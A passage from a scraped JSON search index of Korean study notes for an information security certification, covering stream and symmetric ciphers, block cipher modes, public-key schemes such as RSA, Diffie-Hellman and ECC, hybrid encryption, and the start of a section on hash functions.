혹은 암호문 비트와 키 비트 사이에 어떠한 관계도 없이 생성                                               One-Time Pad                                    동기식 스트림 암호중에서 가장 간단하고 안전한 암호                   Gilbert Vernam에 의해 설계됨                   암호화를 수행할 때마다 랜덤하게 선택된 키스트림을 사용                   해독 불가능하다는 것이 증명됨                   암호화/복호화 알고리즘은 각각 배타적 논리합 연산을 사용                   한번에 한 비트씩 사용                                               귀환 쉬프트 레지스터 (Feedback Shift Register)                                    One-Time Pad 의 절충안                   FSR은 소프트웨어, 하드웨어 환경에서 모두 구현될 수 있지만 하드웨어가 좀 더 용이                   쉬프트 레지스터와 귀환 함수로 구성                                               선형 귀환 쉬프트 레지스터 (LFSR, Linear Feedback Shift Register)               비선형 귀환 쉬프트 레지스터 (NLFSR, NonLinear Feedback Shift Register)                                    LFSR은 선형성으로 공격에 취약, 따라서 더 안전한 스트림 암호 설계를 위해 사용                   비선형으로 설계되는 것 외에는 LSFR 와 동일                                                                   비동기식 스트림 암호                            키 스트림의 각 비트는 이전의 평문이나 암호문에 종속적으로 결정               블록 암호에서 다른 운영 모드를 생성하기 위해 사용되는 한 가지 방법인 CFB모드 (Cipher Feedback Mode) 는 실제로 스트림 암호를 생성함                                                   ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","블록 암호","스트림 암호"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-Cryptography/",
        "teaser": null
      },{
        "title": "정보보안 - 대칭키 암호",
        "excerpt":"대칭키 암호의 종류     DES (Data Encryption Standard)            개요                    NIST(미국 국립기술표준원) 에서 1973년 국가적으로 사용할 대칭키 암호시스템 제안요청서를 발표           IBM의 제안으로 DES가 채택됨           FIPS(연방정보처리기준) 의 초안으로 공표           DES 발표 후 가장 널리 사용된 대칭키 블록 암호           이후 삼충 DES 사용을 권고한 FIPS 46-3 발표           최신 AES 는 DES 를 대체한 알고리즘                       개관                    평문의 길이는 64비트, 키의 길이는 56비트, 이보다 길면 64비트 블록으로 나눔           DES 구조는 Feistel 네트워크의 변형, 라운드 회수는 16           원래 키로부터 16개의 서브키를 생성하고 서브키를 각 라운드에서 사용           DES 복호화 과정은 암호화 과정과 동일                       DES의 구조                    개요                            두 개의 전치(P-박스)와 16개의 Feistel 라운드 함수로 구성               P-박스는 초기 전치(initial Permutation) 과 최종 전치(Final Permutation) 임               암호화                                                                                                                                    Plain Text                           Plain Text (평문을 절반으로 자름)                                                                                                           P-Box                   1 Round                                            R2 = L1 XOR F1(R1)&lt;-K1                       L2 = R2                                                           …                   16 Round (교차 없음)                                            R16 = R15                       L16 = L15 XOR F15(R15)&lt;-K15                                                           P-Box                   64Bit 암호문(Cipher Text)                                               복호화도 동일하게 마지막 라운드에 교차 없음                                   라운드 함수                            개요                                    DES 는 16번의 라운드 함수를 사용                   각 라운드 함수는 Fiestal 암호로 되어있음                   라운드 함수는 이전 라운드 함수의 출력 값 L-1 과 R-1 을 입력으로 받고 다음 라운드에 입력으로 전송될 L 과 R을 생성                   각 라운드에는 2개의 암호 요소 혼합기(mixer) 와 교환기 (swapper) 가 있음, 이런 요소들은 역연산이 가능함                                               DES 함수                                    DES 의 핵심은 함수                   라운드 함수에서 사용된 함수를 가리킴                   DES 함수는 32비트 출력값을 산출하기 위해 가장 오른쪽의 32비트에 48비트 키를 적용                   DES 함수는 확장 P-박스, 키 XOR, 8개의 S-박스 그리고 단순 P-박스의 4개 부분으로 구성                                            예시                                                    32Bit 입력                           확장 P-박스 (48Bit)                           48Bit XOR Key (48Bit)                           S-Box (8개)                           32Bit 출력                           단순 P-박스                           32Bit 결과                                                                                                                                                           암호화 알고리즘과 복호화 알고리즘                            라운드 키들이 역순으로 적용되어야 한다는 사실이 중요               암호화 과정에서 1라운드는 K1, 복호화 과정에서 1라운드는 K16                                               DES 분석                    설계 기준                            S-박스                                    각 라운드에서 그 다음 라운드까지 혼돈과 확산 성질을 만족하도록 설계                   비선형 함수                   입력 값의 한 비트를 바꾸면 출력 값에서 두 비트 이상 바뀜                                               P-박스                                    32비트에서 32비트로 가는 하나의 단순 P-박스                   32비트에서 48비트로 가는 하나의 확장 P-박스                   2개의 P-박스는 비트들을 동시에 확산(diffusion) 시킴                                                                   DES의 취약점                            키의 크기(56비트)               키에 대한 전수 조사를 위해 2의 56승 키를 조사               전사공격 가능                                    다중 DES 사용                                                                               다중 DES                    삼중 DES                            개요                                    두 개의 키를 갖는 삼중 DES 와 세 개의 키를 갖는 삼중 DES가 있음                                               두 개의 키를 갖는 삼중 DES (DES-EDE2)                                    두 개의 키를 갖는 삼중 DES 에서는 k1과 k2 두 개의 키를 사용                   첫 번째와 세번째 단계에서는 k1, 두 번째 단계에서는 k2를 사용                   하나의 DES로 삼중 DES를 만들기 위하여 암호화 과정의 중간 단게에서는 복호화 알고리즘을 사용하고, 복호화 과정에서는 DES 암호화 알고리즘을 사용                   기지평문 공격에 취약                                               세 개의 키를 갖는 삼중 DES (Triple-DES)                                    세 개의 키 k1, k2, k3 를 사용                   P -&gt; 암호화(k1) -&gt; 복호화(k2) -&gt; 암호화(k3) -&gt; 암호문                   PGP (이메일 보안, Pretty Good Privacy) 에서 사용                   기지평문 공격 보완                   복호화 : 암호화의 역                   트리플 DES에서 모든 키를 동일하게 하면 3DES는 보통 DES와 같아짐                   과거에 DES로 암호화된 암호문을 3DES를 사용하여 복호화 가능                                                                                   AES            개요                    역사                            1997년 미국 국립기술표준원(NIST)은 DES를 대체하기 위해 Advanced Encryption Standard(AES) 암호 알고리즘을 공모               NIST의 제안 요청서                                    128비트 블록크기                   128, 192, 256 비트의 세 가지 키 크기                   공개 알고리즘으로 누구나 이용 가능해야 함                                               레인달(Rijndael) AES 알고리즘 선택                                   선정기준                            안정성               비용               구현 효율성                                   라운드(Rounds)                            AES는 128비트 평문을 128비트 암호문으로 출력하는 알고리즘               Non-feistel 알고리즘               10 (128bit key), 12 (192bit key), 14 (256bit key) 라운드 사용               AES-128, AES-192, AES-256 으로 불림                                               암호(Ciphers)                    개요                            DES : Feistel 네트워크를 기본 구조로 사용               Rijndael : SPN (Substitution-Permutation Network) 구조 사용               연산은 바이트 단위의 연산을 사용               S-Box 를 이용한 치환, 행이동, 행연산 열변환, 키연산 열변환의 4가지 기본연산을 수행               알려진 공격방법들로부터 안전하도록 설계               하드웨어, 소프트웨어 구현 시 속도나 코드 압축성 면에서 효율적                                   SPN 구조                            라운드 함수가 역변환이 되어야 한다는 등의 제약이 있음               더 많은 병렬성을 제공               입력을 여러 개의 소블록으로 나누고 각 소블록을 S-box에 입력하여 치환, S-box의 출력을 P-box로 전치하는 과정 반복                                   Feistel 과 SPN 구조 알고리즘                            Feistel : DES, Blowfish, MISTY, RC5               SPN : IDEA, Rijndael (AES), Square                                                DES 와 AES 의 비교                                                                  구분                   DES                   AES                                                                                   년도                   1976                   1999                                                     블록크기                   64bits                   128bits                                                     키 길이                   56bits                   128,192,256bits                                                     암호화 프리미티브                   치환,전치                   치환,시프트,비트 혼합                                                     암호학적 프리미티브                   혼돈,확산                   혼돈,확산                                                     설계                   공개                   공개                                                     설계 원칙                   비공개                   공개                                                     선택 과정                   비밀                   비밀,공모                                                     출처                   IBM,NSA                   벨기에 암호학자                                                                                   기타 대칭키 암호 알고리즘            IDEA(International Data Encryption Algorithm)                    DES를 대체하기 위해 스위스 연방 기술 기관에서 개발           128비트의 키를 사용해 64비트의 평문을 8라운드를 거쳐 64비트 암호문으로 변경           Feistel 구조           DES 보다 2배 빠름           무차별 공격에 더욱 효율적으로 대응           PGP 암호화 소프트웨어에서 사용                       SEED                    KISA 에서 개발한 알고리즘           인터넷, 전자상거래, 무선 통신 등에서 공개될 경우 민감한 영향을 끼칠 수 있는 중요 정보 및 개인 정보를 보호하기 위해 개발된 대칭 알고리즘           1999년 9월 정보통신단체표준(TTA) 로 제정           2005년 국제 표준화 기구인 ISO/IEC 및 IETF에서 국제 블록암호 알고리즘 표준으로 제정                            IEC(International Electro-technical Commission) : 국제전기기술위원회               IETF(Internet Engineering Task Force) : 국제 인터넷 표준화기구                                   128비트 비밀키에서 생성된 16개의 64비트 라운드키를 사용하여 16라운드                            2009년에는 256비트 비밀키 사용 (SEED256)                                   128비트의 평문 블록을 128비트 암호문 블록으로 출력           DES 와 유사한 변형된 Feistel 구조           f 함수의 비선형성 안전도에 의존                       ARIA (Academy Research Institute Agency)                    국가보안기술연구소(NSRI) 주도로 학계, 국가정보원 등의 암호기술전문가들이 개발한 국가 암호화 알고리즘           ARIA : 개발팀이 학계, 연구소, 정부기관으로 구성됨           ISPN(Involutional SPN) 구조           128비트 블록 암호           128비트, 192비트, 256비트의 3종류의 키 사용을 제공           길이에 따라 ARIA-128, ARIA-192, ARIA-256           입출력 크기와 사용가능한 키 크기는 미국 표준 블록 암호인 AES와 동일                       HIGHT (HIGh security and light weigHT)                    KISA, ETRI, 고려대에서 2005년도에 개발           2006년에 TTA (정보통신단체) 표준으로 제정됨           2010년 ISO/IES 국제표준 암호로 제정           64bit 블록암호           저전력, 경량화                       LEA (Lightweight Encryption Algorithm)                    2012년 국가보안기술연구소(NSRI) 가 개발한 경량 고속 암호화 알고리즘           128bit 블록암호           AES에 비해 1.5~2배 빠름           스마트폰, 사물인터넷 등에 사용                       RC5                    1994년 RSA 연구소에서 개발           입출력, 키, 라운드 수가 가변적임           32bit, 64bit, 128bit 블록암호           DES의 10배의 속도                                대칭키 암호 정리                                  구분           국가           개발년도           특징           블록크기           키의길이           라운드수                                           DES           미국           1927년           NIST에서 표준으로 공표(1997년)           64           56           16                             IDEA           유럽           1990년           PGP 채택           64           128           8                             Rijndael           벨기에                       2000년 AES알고리즘으로 선정           128           128,192,256           10,12,14                             SEED           한국           1999년           한국표준 블록암호 알고리즘           128           128           16                             CRYPTON           한국           1998년                       128           0-256           12                             RC5           미국           1994년           알고리즘이 간단, 속도가 빠름           64           0-256           16                             FEAL           일본           1987년           S/W구현에 적합           64           64           4                             MISTY           일본           1996년           차분/선형공격에 안정성증명구조           64           128           8                             SKIPJACK           미국           1990년           Fortezza카드에 사용           64           80           32                           현대 대칭키 암호를 이용한 암호화 기법            현대 블록 암호의 사용                    개요                            기본개념                                    블록 암호를 다양한 응용에 사용하기 위해 NIST에서 5가지 운영모드를 정의                   DES, AES를 포함한 어떤 대칭 블록 암호에도 적용 가능                   ECB모드 : Electric CodeBook mode (전자 부호표 모드)                   CBC모드 : Cipher Block Chaining mode (암호 블록 연쇄모드)                   CFB 모드 : Cipher-FeedBack mode (암호 피드백 모드)                   OFB 모드 : Output-FeedBack mode (출력 피드백 모드)                   CTR 모드 : CounTeR mode (카운터 모드)                                            CFB, OFB, CTR 모드 : 스트림 암호화 방식                                                                                                           Electric CodeBook(ECB) 모드                            개요                                    가장 간단한 모드. 평문은 N개의 n비트 블록으로 분할                   평문 크기가 블록 크기의 배수가 아니라면, 평문의 마지막 블록은 다른 블록들과 동일한 크기로 만들기 위하여 padding이 필요                   각 블록에 키는 동일                                               응용                                    매우 많은 데이터베이스를 암호화할 때 병렬적으로 처리 가능                   암호화된 레코드를 저장하거나 복호화 해야하는 분야에서 독립성이 유용                   다른 레코드에 영향을 주지 않음                                               암호화 예시                                    P1 -&gt; Enc(K1) = C1                   P2 -&gt; Enc(K1) = C2                   P3 -&gt; Enc(K1) = C3                   P4 -&gt; Enc(K1) = C4                                                                   Cipher Block Chaining(CBC) 모드                            개요                                    각각의 평문 블록은 암호화되기 전에 이전 암호화 블록과 XOR 됨                   블록이 암호화될 때 암호화블록은 전송되지만, 다음 블록 암호화를 위해 메모리에 저장됨                   첫 번째 블록은 이전 암호화 블록이 없으므로 초기벡터라고 불리는 허구의 블록이 사용됨                                               암호화와 복호화                                    1단계 전에 수행되어 결과로 출력된 암호문 블록에 평문 블록을 XOR 하고 나서 암호화를 수행함                   복호화할 때 암호문 블록 1개가 파손된 경우, 평문 블록에 미치는 영향은 2개 블록에 머문다. 반면 평문 블록 한 비트 오류는 모든 암호문에 영향을 미친다.                                               CBC 모드 활용                                    인터넷에서 보안을 제공하는 프로토콜 중 하나인 IPSec 에서 통신의 기밀성을 지키기 위해 CBC 모드를 사용                   3DES 를 CBC 모드로 사용한 3DES-CBC, AES를 CBC로 사용한 AES-CBC                   CBC 모드 인증으로 수행하는 대칭키 암호 시스템의 하나인 Kerberos version 5에서도 사용                                               암호화 예시                                    P1 -&gt; IV Xor -&gt; Enc(K1) = C1                   P2 -&gt; C1 Xor -&gt; Enc(K2) = C2                   P3 -&gt; C2 Xor -&gt; Enc(K3) = C3                   P4 -&gt; C3 Xor -&gt; Enc(K4) = C4                   IV 가 바뀌면 암호문 블록 모두가 바뀌게 됨                   P1 가 바뀌면 암호문 블록 모두가 바뀌게 됨                                               복호화 예시                                    C1 -&gt; Dec(K1) -&gt; IV Xor = P1                   C2 -&gt; Dec(K2) -&gt; C1 Xor = P2                   C3 -&gt; Dec(K3) -&gt; C2 Xor = P3                   C4 -&gt; Dec(K4) -&gt; C3 Xor = P4                   C2 가 손상되면 P2, P3가 영향을 받음                                            암호문 길이에는 변화가 없어야 함                                                                                                           Cipher-FeedBack(CFB) 모드 / 스트림암호 방식 블록암호 모드                            개요                                    어떤 블록 암호도 스트림 암호로 바꿀 수 있다.                   스트림 암호의 경우 메시지의 길이가 블록의 정수배가 되도록 패딩 할 필요가 없으며 실시간으로 사용 가능                   한 문자를 전송하는 경우 문자 중심 스트림 암호를 이용하여 각 문자가 암호화되는 즉시 전송 가능                                               암호화와 복호화                                    복호화 과정은 평문 블록과 암호문 블록의 역할만 바뀌었을 뿐 동일                                            CBC에서는 복호화 함수를 사용                       CFB에서는 암호화 함수를 복호화에 사용                                                           DES 나 AES 와 같은 블록 암호를 이용한 운용 모드                   그 결과는 스트림암호와 같다.                                            키 스트림이 암호문에 의존하는 비동기식 스트림암호와 비슷                                                                                       암호화 예시                                    IV -&gt; Enc(K1) -&gt; P1 Xor = C1                   C1 -&gt; Enc(K2) -&gt; P2 Xor = C2                   C2 -&gt; Enc(K3) -&gt; P3 Xor = C3                   C3 -&gt; Enc(K4) -&gt; P4 Xor = C4                                               복호화 예시                                    IV -&gt; Enc(K1) -&gt; C1 Xor = P1                   C1 -&gt; Enc(K2) -&gt; C2 Xor = P2                   C2 -&gt; Enc(K3) -&gt; C3 Xor = P3                   C3 -&gt; Enc(K4) -&gt; C4 Xor = P4                                                                   Output-FeedBack(OFB) 모드 / 스트림암호 방식 블록암호 모드                            개요                                    CFB 모드와 유사하지만 모든 암호문 블록의 각 비트는 이전 암호문 블록의 비트들과 독립적                                            오류 파급의 영향을 피할 수 있음                       오류 발생 시 다른 비트에 영향 안줌                       CFB와 마찬가지로 초기화 벡터 사용                                                           스트림 암호로서의 OFB 모드                                            블록 암호를 기반으로 한 스트림 암호                       키 스트림은 평문이나 암호문과는 독립적이므로 동기식 스트림암호                       IV 암호화 -&gt; 평문 블록과 XOR -&gt; 암호화 블록 생성                       IV 암호화 결과를 암호화 -&gt; 평문 블록과 XOR -&gt; 암호화 블록 생성                                                                                       암호화 예시                                    IV -&gt; Enc(K1) = I1 -&gt; P1 Xor = C1                   I1 -&gt; Enc(K2) = I2 -&gt; P2 Xor = C2                   I2 -&gt; Enc(K3) = I3 -&gt; P3 Xor = C3                   I3 -&gt; Enc(K4) = I4 -&gt; P4 Xor = C4                                               복호화 예시                                    IV -&gt; Enc(K1) = I1 -&gt; C1 Xor = P1                   I1 -&gt; Enc(K2) = I2 -&gt; C2 Xor = P2                   I2 -&gt; Enc(K3) = I3 -&gt; C3 Xor = P3                   I3 -&gt; Enc(K4) = I4 -&gt; C4 Xor = P4                                               초기치가 바뀌면 모든 암호문이 바뀜               암호화 알고리즘의 결과는 평문과는 무관하다                                   CounTeR(CTR) 모드 / 스트림암호 방식 블록암호 모드                            개요                                    ATM(asynchronous transfer mod) 네트워크 보안과 IPSec 에 응용되면서 관심이 늘어남.                   암호화 시 피드백이 존재하지 않음. -&gt; 암/복호화 병렬처리가 가능                   키 스트림의 의사난수성은 카운터를 사용함으로써 성취될 수 있음                   CTR 값은 암호화 할 때마다 새로운 비표값으로 생성                   CTR 모드는 OFB 모드와 마찬가지로 이전 암호문 블록과 독립적인 키 스트림을 생성하지만 (동기식) 피드백을 사용하지 않음                   ECB 모드처럼 CTR 모드는 서로 독립적인 n비트 암호문 블록을 생성함                                            ECB와 CTR은 암복호화 병렬처리가 가능                       OFB : 병렬처리 불가                       CBC/CFB : 복호화만 병렬처리 가능                                                           CTR 암호화 -&gt; 평문블록과 XOR -&gt; 암호화 블록 생성                                               암호화 예시                                    CTR+0 -&gt; Enc(K1) -&gt; P1 Xor = C1                   CTR+1 -&gt; Enc(K2) -&gt; P2 Xor = C2                   CTR+2 -&gt; Enc(K3) -&gt; P3 Xor = C3                   CTR+3 -&gt; Enc(K4) -&gt; P4 Xor = C4                                               복호화 예시                                    CTR+0 -&gt; Enc(K1) -&gt; C1 Xor = P1                   CTR+1 -&gt; Enc(K2) -&gt; C2 Xor = P2                   CTR+2 -&gt; Enc(K3) -&gt; C3 Xor = P3                   CTR+3 -&gt; Enc(K4) -&gt; C4 Xor = P4                                                                                   블록 암호 공격            차분공격에 대한 기본 개념 (Differential Cryptanalysis)                    선택 평문 공격           두 개의 평문 블록들의 비트의 차이에 대응되는 암호문 블록들의 비트의 차이를 이용하여 사용된 암호키를 찾는 방법                       선형공격에 대한 기본 개념 (Linear Cryptanalysis)                    기지 평문 공격           알고리즘 내부의 비선형 구조를 적당히 선형화시켜 암호키를 찾는 방법           평문과 암호문 비트를 XOR 하여 0이 되는 확률                       전수공격법 (Exhaustive key search)                    암호화할 때 일어날 수 있는 모든 경우에 대해 조사           경우의 수가 적을 때 좋음                       통계적 분석 (Statistical analysis)                    암호문에 대한 평문의 각 단어의 빈도에 관한 자료와 더불어 지금까지 알려진 모든 통계적인 자료를 이용하여 해독                       수학적 분석 (Mathematical analysis)                    통계적인 방법과 수학적 이론을 이용                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","대칭키 암호"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-SymmetricKeyAlgorithm/",
        "teaser": null
      },{
        "title": "정보보안 - 비대칭키 암호",
        "excerpt":"비대칭키 암호     키 배송 문제            개요                    대칭키 암호를 사용하려면 키 배송 문제(key distribution problem) 발생                            암호화 키와 복호화 키가 동일               키 배송 중 도청 가능성                                   해결방안                            키의 사전 공유에 의한 해결               키배포 센터에 의한 해결               Diffie-Hellman 키 교환에 의한 해결               공개키 암호에 의한 해결                                               키의 사전 공유에 의한 해결                    안전한 키를 사전에 공유함                            안전한 통로를 이용함                                    Trusted Authority (TA : 키관리기관)                                                                   인원이 많아지면 키가 많아져서 문제           n명의 사원이 자신 외의 사람과 통신시 키는 n(n-1)/2 이다.                       키배포 센터에 의한 해결                    KDC (Key Distribution Center : 온라인 키 분배 - 일종의 TA)           암호 통신이 필요해질 때마다 통신용 키를 키배포 센터라는 신뢰받은 3자에 의해 공유           과정                            1 : A 가 KDC에 B와 통신을 하겠다고 요청               2 : KDC는 DB에서 A의 키와 B의 키를 추출(비밀키)               3 : KDC는 A의 키, B의 키를 이용해 세션키를 생성, 각각 비밀키로 암호화함               4 : A 에게 A의 키를 이용해 암호화한 세션키를 전달               5 : B 에게 B의 키를 이용해 암호화한 세션키를 전달               6 : A 는 자신의 개인키를 이용해 세션키를 복호화               7 : A 는 세션키를 이용해 전송할 메시지를 암호화하여 B에게 전송               8 : B 는 자신의 개인키를 이용해 세션키를 복호화               9 : B 는 세션키를 이용해 A에게 전송받은 메시지를 복호화               10 : 통신 종료 후 세션키는 폐기                                               Diffie-Hellman 키 교환에 의한 해결                    개요                            1976년 공개키 암호방식을 최초로 제안한 휘트필드 디피와 마틴 헬먼이 발명한 알고리즘               공개키 암호방식의 개념을 이용하여 두 사용자 간에 공통의 암호화키를 안전하게 공유할 수 있는 방법 제시 (최초의 비밀키 교환 프로토콜)               Diffie-Hellman 프로토콜 방법에서는 양쪽 통신 주체가 KDC 없이 대칭 세션키를 생성, 대칭키를 만들기 전에 두 개의 수 p와 g를 선택해야 함. p는 매우 큰 소수로서 300자리가 넘는 십진수               키 교환이라는 이름이 붙어있지만 키 교환이 아니라 공유할 키를 계산하여 만들어 내는 것, 때문에 키 합의(Diffie-Hellman key agreement)로 불리기도 함               유한체상의 이산대수문제를 풀기 어렵다는 사실이 이를 뒷받침함                                   Diffie-Hellman의 안정성                            두 가지 공격에 약점을 보임, 이산대수공격, 중간자 공격               이산대수공격                                    키 교환의 안정성을 이산대수문제를 풀기 어렵다는데 기반을 둔다.                   Eve가 R1과 R2를 가로챌 수 있으므로 대칭키 K를 계산할 수 있다.                                            A : R1 (공개값) = g^x mod p                       B : R2 (공개값) = g^y mod p                       A 는 R1을 B에 전송                       B 는 R2을 A에 전송                       A : K = R2^x mod p                       B : K = R1^y mod p                                                    K = g^xy mod p                                                                       Eve 가 R1, R2 를 가로채 x,y 를 추출하여 K를 생성할 수 있음                                                           x, y값을 추출해내서 더 이상 비밀키가 비밀이 되지 않는다.                                               중간자 공격(man in the middle attack)                                    키 교환 프로토콜은 인증 단계가 없어서 이런 공격에 취약                   공격을 막기 위해 디지털서명과 공개키 인증서 등을 이용하면 됨                                               DoS 공격                                    Diffie-Hellman 은 지수함수에 기초하고 있어 계산이 복잡함                   동시에 통신 시 비밀키 생성 시 많은 부하가 걸림                   키 생성을 다수 요청하면 서버가 마비됨                                                                               공개키 암호에 의한 해결                    개요                            대칭키 암호에서 암호화키와 복호화키는 같다. 공개키 암호에서는 이 두개가 다르다.               수신자는 미리 암호화키 (공개키) 를 송신자에게 알려준다. Eve 에게 알려져도 괜찮다. 송신자는 암호화키 (공개키) 로 암호화하여 수신자에게 보낸다.               복호화는 복호화키 (개인키) 를 가지고 있는 사람(수신자)만 가능하다. 이러면 복호화키를 전달할 필요가 없다.                                                   공개키 암호 (public-key cryptography)            개요                    대칭키 암호는 평문을 복잡한 형태로 변환해서 기밀성을 유지           공개키 암호는 수학적으로 해결하기 곤란한 문제 (소인수분해, 이산대수…) 를 토대로 해서 기밀성을 유지           전자문서의 무결성, 전자서명(부인방지) 구현에 활용           다양한 암호 프로토콜에 사용           공개키 암호에서는 암호화키와 복호화키가 분리되어 있음.                       수학적으로 해결하기 곤란한 문제                    소인수분해 문제                            RSA               Rabin                                   이산대수 문제                            ElGamal               DSA (DSS)               ECC (타원곡선)                                    ECDSA                   KCDSA                                                                               과정                    1 : A가 세션키를 B의 공개키로 암호화           2 : A가 암호화된 세션키를 B에 전송           3 : B가 B의 개인키로 암호화된 세션키를 복호화                            B의 공개키 / 개인키는 수학적으로 밀접한 관계가 있음                                   4 : A 와 B의 키 교환 완료                           RSA 암호시스템            개요                    기본 개념                            RSA 는 공개키 암호 알고리즘 중 하나               세계적으로 사실상 표준               Rivest-Shamir-Adelman 의 첫 글자를 따서 붙여짐               인수분해 문제해결의 높은 난이도를 이용한 가장 대표적인 공개키 암호 알고리즘               디지털 서명의 용도로도 사용됨               SSL 프로토콜을 가진 웹 브라우저, PGP, 공개키 암호시스템을 사용하는 정부 시스템 등에서 사용                                   암호화와 복호화                            RSA는 e와 d 두 지수를 사용                                    A (송신자) : C = P^e mod n                   B (수신자) : P = C^d mod n                                            e : 공개하는 값                       d : 비밀로 유지하는 값                       P : 평문                       C : 암호문                       n : 매우 큰 수                                                                                                           RSA 에 대한 공격                            소인수분해 공격                                    RSA 는 모듈러 값이 매우 커서 이 값을 적절한 시간 내에 소인수분해 하는 것이 불가능                   B (수신자) 은 p와 q 를 선택하고 n = p * q 를 계산                                            n은 공개되지만 p와 q 는 비밀임                       Eve가 n을 소인수분해하여 p와 q를 구할 수 있다면 Pi(N) 을 구할 수 있음                                                           소인수분해 알고리즘 (Factoring Attack) 이 개발되지 않는다면 RSA는 안전하다고 할 수 있음                                               중간자 공격                                    중간자 공격은 기밀성에 매우 유효한 공격 방법                   적극적 공격자 멜로리가 송신자와 수신자 사이에 들어가서 송신자에 대해서는 수신자처럼, 수신자에 대해서는 송신자처럼 행세하는 공격                   중간자 공격을 막기 위해서는 입수한 공개키가 밥의 것이라는 것을 확인할 수단인 인증이 필요하다.                                                                                   Rabin 암호시스템            개요                    M.Rabin 이 고안, RSA 암호시스템의 변형           RSA는 지수 합동, Rabin은 2차 합동에 근거                       암호화와 복호화                    Rabin 암호시스템에서 암호화는 매우 간단, 한 번의 곱셈으로 이루어짐           성능이 낮은 플랫폼에서 잘 활용됨 (스마트 카드 등)                       Rabin 시스템의 보안                    p와 q 가 충분히 크기만 하면 안전 (mod N을 구하는 것이 어려움)           RSA 만큼 안전                           ElGamal 방식            개요                    Taher ElGamal 이 발명           이산대수 문제에 근거해서 만든 시스템 (오픈 소스를 기초, 키 분배 방식 및 공개키 암호 방식 실현)           디지털 서명, 암호화, 키교환           Diffie-Hellman 암호화 기능의 확장, 속도가 느림                       암호화와 복호화                    Bob의 공개키를 이용해 누구든 Bob에게 메시지를 보낼 수 있음           고속 지수 알고리즘을 사용하면 다항식 정도의 복잡도를 가지는 시간 내에 수행 가능           암호화에서는 암호문의 길이가 평문의 2배가 되어 버린다는 결점                       응용                    RSA 를 활용할 수 있는 곳에는 어디에서나 사용 가능           키 교환, 인증, 짧은 메시지의 암호화와 복호화에 사용           암호 소프트웨어 GnuPG에 구현되어 있음                           타원곡선 암호 (ECC, elliptic curve cryptosystem)            등장배경                    RSA 와 ElGamal 이 안전한 비대칭키 암호시스템이기는 하지만 보안을 위해서 키의 길이가 매우 커야한다는 단점이 있음           따라서 키의 길이가 짧아도 되는 암호시스템을 연구 -&gt; ECC           타원곡선 이론에 근거                       특징                    유한체 위에서 정의된 타원곡선 군에서의 이산대수 문제에 기초한 공개키 알고리즘           RSA 암호방식에 이어 전자상거래의 핵심 기술로 주목           1985년 코블리치(N.Koblitz) 와 밀러(V.S.Miller)가 RSA 암호방식의 대안으로 처음 제안           RSA보다 키의 비트 수를 적게 하면서도 동일한 성능을 제공하는 것이 특징                            160비트 ECC는 1024비트 RSA 키와 동일한 보안수준                                   다양한 암호방식 설계가 용이                            H/W 와 S/W 로 구현하기 용이               스마트카드나 무선통신단말기 등과 같이 메모리 처리능력이 제한된 응용 분야에 특히 효율적               전자상거래의 핵심                                   ECC 는 RSA 보다 상대적으로 지명도가 부족, 배경이론이 복잡하며 해당 분야의 전문가가 적다는 단점이 있음           빠른 속도로 구현이 가능                                ECC 와 RSA 방식 비교                                                  항목               ECC 방식               RSA 방식                                                               기반구조               WPKI(무선)               PKI(유선)                                         속도               우수               느림                                         키 크기               상대적으로 작은 키               ECC에 비해 큰 키                                         적용               소형 Mobile환경               인프라가 다소 구현된 환경                                                   하이브리드 암호시스템            대칭키 암호와 공개키 암호                    대칭키 암호 특징                            장점 : 대칭키 암호를 사용하면 기밀성을 유지한 통신이 가능               단점(a) : 키 배송 문제가 발생                                   공개키 암호 특징                            장점 : 키를 배송할 필요가 없음               단점(a) : 대칭키 암호에 비해 처리속도가 느림               단점(b) : 중간자 공격에 약함                                   하이브리드 암호 시스템은 이 중 (a)의 문제를 해결하기 위한 방법           (b)를 해결하려면 인증이 필요                       개요                    대칭키 암호와 공개키 암호의 장점을 살릴 수 있도록 조합한 방법           메시지를 고속의 대칭키 암호로 암호화함           대칭키 암호의 키 기밀성을 위해 공개키 암호를 사용                            메시지 암호화에 사용한 대칭키 암호키를 공개키 암호로 암호화                                               과정                    암호화                            PRNG(의사난수 생성기)를 이용해 K(세션키) 생성               K 를 수신자의 Kpub(공개키)를 이용해 C1(암호문) 생성               P(평문) 는 K(세션키) 를 이용해 암호화(C2)               C1 과 C2를 결합 =&gt; 하이브리드 시스템 암호문                                   복호화                            하이브리드 시스템 암호문 =&gt; C1 과 C2 를 분리                                    C1 : 세션키 암호                   C2 : 메시지 암호                                               C1 은 수신자의 Kpri(개인키)를 이용해 평문 K(세션키) 를 추출               C2 은 K(세션키) 를 이용해 평문 P(메시지) 를 추출                                               하이브리드 암호 시스템의 예                    공개키 암호의 처리 속도가 느린 것을 대칭키 암호로 해결, 대칭키 암호의 키 배송 문제를 공개키 암호로 해결           유명한 암호 소프트웨어인 PGP 와 Web의 암호통신에 사용되고 있는 SSL/TLS 에서도 하이브리드 암호시스템 사용           PGP의 처리에서는 하이브리드 암호시스템에 디지털서명, 디지털서명의 검증, 개인키의 관리도 추가하여 사용됨.                           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","비칭키 암호"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-AsymmetricKeyAlgorithm/",
        "teaser": null
      },{
        "title": "정보보안 - 해시함수",
        "excerpt":"해시함수     해시함수            일방향 해시함수                    일방향 해시함수의 개요                            기본개념                                    일방향 해시함수(one-way hash function) 에는 입력과 출력이 각각 1개씩 있음                   입력은 메시지(message) - 임의의 길이, 출력은 해시값(hash value) - 고정된 길이                                                                   일방향 해시함수의 성질                            임의 길이의 메시지로부터 고정 길이의 해시값을 계산               해시값을 고속으로 계산               일방향성을 가짐. (해시값으로부터 메시지를 역산할 수 없음)               메시지가 다르면 해시값도 다름. (무결성 확인용)                                    메시지가 1비트라도 변하면 해시값은 매우 높은 확률로 다른 값이 되야 함.                   2개의 다른 메시지가 같은 해시값을 갖는 것을 충돌(collision) 이라고 함.                                               충돌이 발생하는 것이 어려운 성질 =&gt; 충돌 내성 (collision resistance)               해시 함수 = 메시지 다이제스트 함수 = 메시지 요약함수               무결성 = 완전성 = 보전성                                               메시지 무결성                    무결성 점검                            무결성 점검을 위해 암호학적 해시함수 사용               생성된 메시지 다이제스트와 이전 메시지 다이제스트를 비교               두 개가 동일하면 원래 메시지가 변경되지 않음                                   암호학적 해시함수 기준                            개요 (암호학적 해시함수는 다음을 충족해야 함)                                    